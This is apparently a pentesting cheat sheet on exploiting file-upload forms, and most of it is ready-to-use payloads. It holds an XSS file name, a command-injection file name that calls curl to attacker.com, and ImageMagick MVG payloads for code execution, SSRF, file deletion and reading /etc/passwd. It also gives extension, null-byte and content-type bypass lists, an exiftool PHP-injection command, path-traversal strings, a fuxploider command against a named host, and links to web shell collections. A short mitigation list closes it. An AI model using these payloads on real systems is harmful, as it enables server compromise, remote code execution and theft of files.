Use SQLMap

### **XSS In Filename**

```sql
'"><img src=x onerror=alert(document.domain)>.extension
```

### **Command Injection in File Name {95% in Zip ext}**

```sql
; curl <http://attacker.com>;
```

### **image Magic [Lib Exploiting ]**

`touch payload.mvg`

`convert payload.mvg out.png`

```php
RCE.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0,0,0 '<https://127.0.0.1/x.php?=%60> command`'
push graphic-context
RCE2.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
fill 'url(<https://example.com/image.jpg>"|ls "-la)'
pop graphic-context
ssrf.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
fill 'url(<http://example.com/>)'
pop graphic-context
delete_file.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
popgraphic-context
file_read.mvg
-=-=-=-=-=-=-=-=-
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@...c/passwd'
pop graphic-context
```



### Bypass Validations

- **ext Blacklisting Bypass**
    
    - Manipulate Extension
        
        ```bash
        .phtm
        .phps
        .phar
        .phtm
        .phtml
        .php4
        .php5
        .php6
        .php7
        .pgif
        .shtml
        .htaccess
        .phar
        .inc
        .asp
        .aspx
        .config
        .ashx
        .asmx
        .aspq
        .axd
        .cshtm
        .cshtml
        .rem
        .soap
        .vbhtm
        .vbhtml
        .asa
        .cer
        .shtml
        .aspx;1.png
        Capitalization
        ```
        
- **ext Whitelisting Bypass**
    
    - Manipulate Extension
        
        ```bash
        file.png.php
        file.php%0a.png
        file.php%0d%0a.png
        file.php\\x00.png
        file.php%001.png
        file.php%00.png open file.php
        ```
        
    - Source Code Review [Regex101]
        
- **Client Side Validation Bypass**
    
    - Manipulate shell ext in File selection
        
        ```bash
        mv shell.aspx shell.png
        ```
        
    - Set the original extention in the file name In Interceptor
        
        ```bash
        filename=ax.aspx
        Content-Type: application/x-php
        ```
        
- **Content Type Bypass**
    
    - Manipulate Content-Type Header
        
        ```bash
        Content-Type: image/png
        ```
        
    - Mime Type Sniffing
        
        ```bash
        filename=ax.pg
        Content-Type: application/x-php
        ```
        
- **Content Check Bypass**
    
    - Use MagicBytes
        
        ```bash
        exiftool -Comment="<?php echo '0xBugatt1 ' . file_get_contents('/home/carlos/secret') . ' 0xBugatt1'; ?>" /root/Pictures/me.png -o payload2.p
        ```
        
- **Code Execution Restrictions Bypass**
    
    - overwrite .htaccess
    - Use phtml
    - PathTraversa
    
    same Techniqe used For OverWrite Server Files if You Could Not Get LFD-RCE From php
    
    ```bash
    ../../Filename
    ..././..././..././Filename
    ....//....//Filename
    ..%2f..%2fFilename
    ```
    
- **SandBoxing Bypass**
    
    - We Can Detect Sandboxing Via Responce Time
        
    - We Can Bypass SandBoxing via RaceCondition
        
- **PhpGD Bypass**
    
    - Manipulate The uncahnced Bytes
        
        ```bash
        compere hexdump gd-Converted image and original image 
        Detect fixed bytes
        Put Your Code in them
        ```
        
- **Bypass By Avoid Evil Function**
    
    [https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720](https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720)
    

> 	**Note all This Techniques We Test Them as BlackBox Pentesters So It May Fail with You . My Advice To Keep Trying**

### Matigation

- Renaming Files to Unique Name Use [https://github.com/0blio/fileGPS](https://github.com/0blio/fileGPS)
- Blacklist/Whitelist Extensions
- ContentType Checking
- File Content Reading and Checking
- Control Execution with .htaccess
- Use S3Bucket and SandBox ([phpsandbox.io](http://phpsandbox.io))

### Automated Tools

[https://github.com/R3K1NG/fuxploider](https://github.com/R3K1NG/fuxploider)

```bash
python fuxploider.py  --random-user-agent -T 50  -u <http://s2bmm.smart-made.com/xvwa/vulnerabilities/fileupload/>  --uploads-path /img/uploads  -f 10 --not-regex  "There was an error uploading the file, please try again "
```

[https://www.youtube.com/watch?v=dc_57FaKj3E](https://www.youtube.com/watch?v=dc_57FaKj3E)

### Exploitation Tools

[https://github.com/MegaBedder/wsoshell](https://github.com/MegaBedder/wsoshell)

[https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

[https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)

[https://github.com/b374k/b374k](https://github.com/b374k/b374k)

[https://github.com/dotcppfile/DAws](https://github.com/dotcppfile/DAws)

[https://github.com/nil0x42/phpsploit](https://github.com/nil0x42/phpsploit)

[https://github.com/BlackArch/webshells](https://github.com/BlackArch/webshells)

[https://github.com/backdoorhub/shell-backdoor-list](https://github.com/backdoorhub/shell-backdoor-list)
### Resources

[https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

[https://teambi0s.gitlab.io/bi0s-wiki/web/file-upload/](https://teambi0s.gitlab.io/bi0s-wiki/web/file-upload/)

[https://doddsecurity.com/94/remote-code-execution-in-the-avatars/](https://doddsecurity.com/94/remote-code-execution-in-the-avatars/)

[https://www.acunetix.com/websitesecurity/upload-forms-threat/](https://www.acunetix.com/websitesecurity/upload-forms-threat/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
